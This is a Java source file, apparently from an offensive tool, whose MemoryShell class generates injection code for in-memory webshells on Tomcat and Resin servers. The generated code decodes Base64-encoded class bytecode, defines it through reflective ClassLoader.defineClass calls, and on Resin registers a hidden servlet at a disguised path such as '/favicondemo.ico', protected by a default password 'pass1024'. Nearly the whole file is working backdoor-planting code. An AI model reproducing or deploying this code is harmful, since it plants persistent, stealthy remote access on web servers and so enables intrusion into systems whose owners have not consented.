package io.github.exp1orer.util;

import javassist.*;

import java.io.IOException;
import java.io.InputStream;
import java.util.Base64;

public class MemoryShell {
    private static MemoryShell instance = new MemoryShell();
    private static String className = "";

    private MemoryShell() {}

    public static MemoryShell getInstance() {
        return instance;
    }

    public static String process(String name) {
        if ("".equals(name.trim()) || name == null) {
            return "";
        }

        if ("ResinMemShellServlet".equals(name)) {
            return instance.resinMemoryShell(name);
        } else {
            return instance.tomcatMemoryShell(name + ".class");
        }

    }

    /**
     * Tomcat内存马注入
     * @param className 类名
     * @return
     */
    private String tomcatMemoryShell(String className) {
        String payload = renameClass("User", "MyObjectLoader.class");
        String bytecodes = renameClass("Login", className);

        String code = String.format("String payload = \"%s\";\n" +
                "        String version = System.getProperty(\"java.version\");\n" +
                "        byte[] bytecodes;\n" +
                "\n" +
                "        try {\n" +
                "            if (version.compareTo(\"1.9\") >= 0) {\n" +
                "                Class base64 = Class.forName(\"java.util.Base64\");\n" +
                "                Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
                "                java.lang.reflect.Method[] methods = decoder.getClass().getMethods();\n" +
                "                java.lang.reflect.Method decode = null;\n" +
                "                for (int i = 0; i < methods.length; i++) {\n" +
                "                    java.lang.reflect.Method method = methods[i];\n" +
                "                    if (method.getName().equals(\"decode\") && method.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                        decode = method;\n" +
                "                    }\n" +
                "                }\n" +
                "                bytecodes = (byte[]) decode.invoke(decoder, new Object[]{payload});\n" +
                "            } else {\n" +
                "                Class base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                java.lang.reflect.Method[] methods = decoder.getClass().getMethods();\n" +
                "                java.lang.reflect.Method decodeBuffer = null;\n" +
                "                for (int i = 0; i < methods.length; i++) {\n" +
                "                    java.lang.reflect.Method method = methods[i];\n" +
                "                    if (method.getName().equals(\"decodeBuffer\") && method.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                        decodeBuffer = method;\n" +
                "                    }\n" +
                "                }\n" +
                "                bytecodes = (byte[]) decodeBuffer.invoke(decoder, new Object[]{payload});\n" +
                "            }\n" +
                "\n" +
                "            java.lang.reflect.Method[] methods = ClassLoader.class.getDeclaredMethods();\n" +
                "            java.lang.reflect.Method defineClassMethod = null;\n" +
                "            for (int i = 0; i < methods.length; i++) {\n" +
                "                java.lang.reflect.Method method = methods[i];\n" +
                "                if (method.getName().equals(\"defineClass\") && method.getParameterTypes().length == 3) {\n" +
                "                    defineClassMethod = method;\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "            defineClassMethod.setAccessible(true);\n" +
                "            Class cc = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n" +
                "            java.lang.reflect.Constructor[] constructors = cc.getConstructors();\n" +
                "            java.lang.reflect.Constructor c = null;\n" +
                "            for (int i = 0; i < constructors.length; i++) {\n" +
                "                java.lang.reflect.Constructor constructor = constructors[i];\n" +
                "                if (constructor.getParameterCount() == 1 && constructor.getParameterTypes()[0].getName().equals(\"java.lang.String\")) {\n" +
                "                    c = constructor;\n" +
                "                }\n" +
                "            }\n" +
                "            c.newInstance(new Object[]{\"%s\"});\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }", payload, bytecodes);
        return code;
    }

    private String resinMemoryShell(String name) {
        String payload = renameClass("User", name + ".class");
        String code = String.format("try {\n" +
                "    Class si = Thread.currentThread().getContextClassLoader().loadClass(\"com.caucho.server.dispatch\" + \".ServletInvocation\");\n" +
                "    java.lang.reflect.Method getContextRequest = si.getMethod(\"getContextRequest\");\n" +
                "    javax.servlet.ServletRequest contextRequest = (javax.servlet.ServletRequest ) getContextRequest.invoke(null);\n" +
                "    com.caucho.server.http.HttpServletRequestImpl req = (com.caucho.server.http.HttpServletRequestImpl ) contextRequest;\n" +
                "    javax.servlet.http.HttpServletResponse rep = (javax.servlet.http.HttpServletResponse)  req.getServletResponse();" +
                "    java.io.PrintWriter out = rep.getWriter();" +
                "    javax.servlet.http.HttpSession session = req.getSession();\n" +
                "    String path = req.getHeader(\"path\") != null ? req.getHeader(\"path\") : \"/favicondemo.ico\";\n" +
                "    String pwd = req.getHeader(\"p\") != null ? req.getHeader(\"p\") : \"pass1024\";\n" +
                "\n" +
                "    java.lang.reflect.Method getServletContext = javax.servlet.ServletRequest.class.getMethod(\"getServletContext\");\n" +
                "    Object web =getServletContext.invoke(contextRequest);\n" +
                "\n" +
                "    com.caucho.server.webapp.WebApp web1 = (com.caucho.server.webapp.WebApp ) web;\n" +
                "\n" +
                "    com.caucho.server.dispatch.ServletMapping smapping = new com.caucho.server.dispatch.ServletMapping();\n" +
                "\n" +
                "    String s1=\"%s\";" +
                "    byte[] bytes1 = java.util.Base64.getDecoder().decode(s1.getBytes());\n" +
                "\n" +
                "    java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                "    m.setAccessible(true);\n" +
                "    m.setAccessible(true);\n" +
                "    m.invoke(ClassLoader.getSystemClassLoader(), new Object[]{\"%s\", bytes1, 0, bytes1.length});\n" +
                "    session.setAttribute(\"u\", pwd);\n" +
                "    smapping.setServletClass(\"%s\");\n" +
                "    smapping.setServletName(\"%s\");\n" +
                "    smapping.addURLPattern(path);\n" +
                "    web1.addServletMapping(smapping);\n" +
                "    out.println(\"->|Success|<-\");" +
                "} catch (Exception e) {\n" +
                "    e.printStackTrace();\n" +
                "}", payload, className, className, className);

        return code;
    }

    private String renameClass(String prefix, String resourceName) {
        String bytecodes = "";
        ClassPool pool = ClassPool.getDefault();
        InputStream is = this.getClass().getResourceAsStream("/" + resourceName);
        if (is == null) {
            return "";
        }

        try {
            CtClass ctClass = pool.makeClass(is);
            className = prefix + System.nanoTime();
            ctClass.setName(className);
            byte[] bytes = ctClass.toBytecode();
            bytecodes = Base64.getEncoder().encodeToString(bytes);
        } catch (IOException | CannotCompileException e) {
            e.printStackTrace();
        }

        return bytecodes;
    }
}
